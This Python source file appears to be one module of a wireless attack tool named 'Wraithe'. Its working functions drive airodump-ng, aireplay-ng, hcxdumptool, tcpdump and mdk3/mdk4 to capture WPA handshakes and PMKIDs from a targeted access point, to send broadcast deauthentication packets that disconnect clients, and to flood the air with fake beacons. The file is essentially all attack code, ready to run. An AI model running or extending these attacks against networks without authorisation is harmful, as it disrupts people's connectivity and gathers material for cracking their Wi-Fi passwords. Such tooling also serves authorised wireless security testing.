"""
Wraithe - Other Attack Modules
Handshake capture, PMKID capture, deauth, beacon flood
"""

import subprocess
import os
import time
import re
import signal
import threading
from datetime import datetime

class OtherAttacks:
    def __init__(self, config=None, log_callback=None):
        self.config = config or {}
        self.log_callback = log_callback or (lambda x: None)
        self._running = False
        self._process = None

    def log(self, msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.log_callback(f'[{timestamp}] {msg}')

    def capture_handshake(self, mon_iface, bssid, channel, essid='',
                          output_dir='/tmp/wraithe_logs', timeout=120):
        """
        Capture WPA/WPA2 handshake using airodump-ng
        Returns path to capture file if handshake captured
        """
        os.makedirs(output_dir, exist_ok=True)
        output_path = os.path.join(output_dir, f'handshake_{bssid.replace(":", "")}')
        
        # Set channel
        subprocess.run(['iw', 'dev', mon_iface, 'set', 'channel', str(channel)],
                      capture_output=True, text=True, timeout=5)
        
        # Start airodump-ng capture
        cmd = ['airodump-ng', mon_iface, '-c', str(channel),
               '--bssid', bssid, '-w', output_path, '--output-format', 'pcap,csv']
        
        self.log(f'Starting handshake capture on {bssid} ({essid})')
        self.log(f'Output: {output_path}')
        self._running = True
        
        try:
            self._process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Send deauth to speed up handshake capture
            time.sleep(5)
            for _ in range(3):
                if not self._running:
                    break
                self.deauth_attack(mon_iface, bssid, count=5)
                time.sleep(3)
            
            # Wait for handshake
            start_time = time.time()
            handshake_found = False
            capture_file = f'{output_path}-01.cap'
            
            while time.time() - start_time < timeout and self._running:
                time.sleep(2)
                
                # Check for handshake in airodump output
                if os.path.exists(capture_file):
                    result = subprocess.run(
                        ['airodump-ng', '-r', capture_file, '--bssid', bssid],
                        capture_output=True, text=True, timeout=10
                    )
                    if 'WPA handshake' in result.stdout or '1 handshake' in result.stdout:
                        handshake_found = True
                        self.log('[!] WPA Handshake captured!')
                        break
                
                self.log(f'Listening for handshake... ({int(time.time() - start_time)}s)')
            
            self._running = False
            if self._process:
                self._process.terminate()
                self._process.wait(timeout=5)
            
            pcap_file = f'{output_path}-01.cap'
            if handshake_found and os.path.exists(pcap_file) and os.path.getsize(pcap_file) > 100:
                return {
                    'success': True,
                    'file': pcap_file,
                    'bssid': bssid,
                    'essid': essid,
                }
            else:
                return {
                    'success': False,
                    'file': pcap_file if os.path.exists(pcap_file) else None,
                    'bssid': bssid,
                }
        
        except Exception as e:
            self._running = False
            self.log(f'Error: {e}')
            return {'success': False, 'error': str(e)}

    def capture_pmkid(self, mon_iface, bssid, channel, output_dir='/tmp/wraithe_logs',
                      timeout=60):
        """
        Capture PMKID using hcxdumptool or bettercap
        PMKID attack works against WPA2/WPA3 with roaming features
        """
        os.makedirs(output_dir, exist_ok=True)
        output_file = os.path.join(output_dir, f'pmkid_{bssid.replace(":", "")}.pcapng')
        
        # Try hcxdumptool first
        self.log(f'Starting PMKID capture on {bssid} (channel {channel})')
        
        try:
            subprocess.run(['which', 'hcxdumptool'], check=True, capture_output=True)
            
            # Set channel and start capture
            subprocess.run(['iw', 'dev', mon_iface, 'set', 'channel', str(channel)],
                          capture_output=True, text=True, timeout=5)
            
            # hcxdumptool: filter by BSSID to reduce noise
            cmd = ['hcxdumptool', '-o', output_file, '-i', mon_iface,
                   '--filterlist_ap=' + self._make_filter(bssid),
                   '--enable_status=1']
            
            self._process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(timeout)
            self.stop()
            
            if os.path.exists(output_file) and os.path.getsize(output_file) > 50:
                # Check if PMKID is in capture
                result = subprocess.run(
                    ['hcxpcapngtool', output_file],
                    capture_output=True, text=True, timeout=30
                )
                if '* PMKID' in result.stdout or 'PMKID' in result.stdout:
                    self.log('[!] PMKID captured!')
                    return {'success': True, 'file': output_file, 'bssid': bssid}
            
            return {'success': False, 'file': output_file, 'bssid': bssid}
            
        except (subprocess.CalledProcessError, FileNotFoundError):
            self.log('hcxdumptool not available, trying tcpdump...')
            return self._pmkid_tcpdump(mon_iface, bssid, channel, output_file, timeout)
        finally:
            self.stop()

    def _pmkid_tcpdump(self, mon_iface, bssid, channel, output_file, timeout):
        """Fallback PMKID capture with tcpdump"""
        try:
            cmd = ['tcpdump', '-i', mon_iface, '-s', '0', '-c', '5000',
                   '-w', output_file, f'wlan addr3 {bssid} and wlan subtype 0x08']
            
            self._process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL)
            time.sleep(timeout)
            self.stop()
            
            if os.path.exists(output_file) and os.path.getsize(output_file) > 100:
                return {'success': True, 'file': output_file, 'bssid': bssid, 'method': 'tcpdump'}
        except:
            pass
        return {'success': False, 'bssid': bssid}

    def _make_filter(self, bssid):
        """Create hcxdumptool filter file"""
        filter_path = '/tmp/wraithe_filter.txt'
        with open(filter_path, 'w') as f:
            f.write(bssid.lower())
        return filter_path

    def deauth_attack(self, mon_iface, bssid, target_mac='FF:FF:FF:FF:FF:FF',
                      count=10, reason=7):
        """
        Deauthentication attack using aireplay-ng
        Disconnects clients from target AP
        """
        cmd = ['aireplay-ng', '-0', str(count), '-a', bssid,
               '-c', target_mac, '--ignore-negative-one', mon_iface]
        
        if target_mac == 'FF:FF:FF:FF:FF:FF':
            # Broadcast deauth — removes the -c flag
            cmd = ['aireplay-ng', '-0', str(count), '-a', bssid,
                   '--ignore-negative-one', mon_iface]
        
        self.log(f'Sending deauth to {bssid} ({count} packets)')
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True, text=True, timeout=30
            )
            return {
                'success': True,
                'bssid': bssid,
                'count': count,
                'output': result.stderr[-200:],
            }
        except subprocess.TimeoutExpired:
            return {'success': True, 'bssid': bssid, 'count': count}
        except Exception as e:
            self.log(f'Deauth error: {e}')
            return {'success': False, 'error': str(e)}

    def beacon_flood(self, mon_iface, essids=50, channel=1, timeout=30):
        """
        Beacon flood attack using mdk4 or mdk3
        Creates fake APs to confuse scanners
        """
        # Create essid list
        essid_file = '/tmp/wraithe_beacon.txt'
        with open(essid_file, 'w') as f:
            for i in range(essids):
                f.write(f'Wraithe_{i:04d}\n')
        
        try:
            cmd = ['mdk4', mon_iface, 'b', '-f', essid_file, '-c', str(channel)]
            subprocess.run(['which', 'mdk4'], check=True, capture_output=True)
        except:
            try:
                cmd = ['mdk3', mon_iface, 'b', '-f', essid_file, '-c', str(channel)]
                subprocess.run(['which', 'mdk3'], check=True, capture_output=True)
            except:
                self.log('mdk3/mdk4 not available')
                return {'success': False, 'error': 'mdk3/mdk4 not found'}
        
        self.log(f'Starting beacon flood ({essids} fake APs)')
        self._running = True
        
        try:
            self._process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                            stderr=subprocess.DEVNULL)
            time.sleep(timeout)
            self.stop()
            
            return {'success': True, 'essids': essids, 'duration': timeout}
        except Exception as e:
            self.stop()
            return {'success': False, 'error': str(e)}

    def stop(self):
        """Stop current attack"""
        self._running = False
        if self._process:
            self._process.terminate()
            try:
                self._process.wait(timeout=3)
            except:
                self._process.kill()

    def is_running(self):
        return self._running
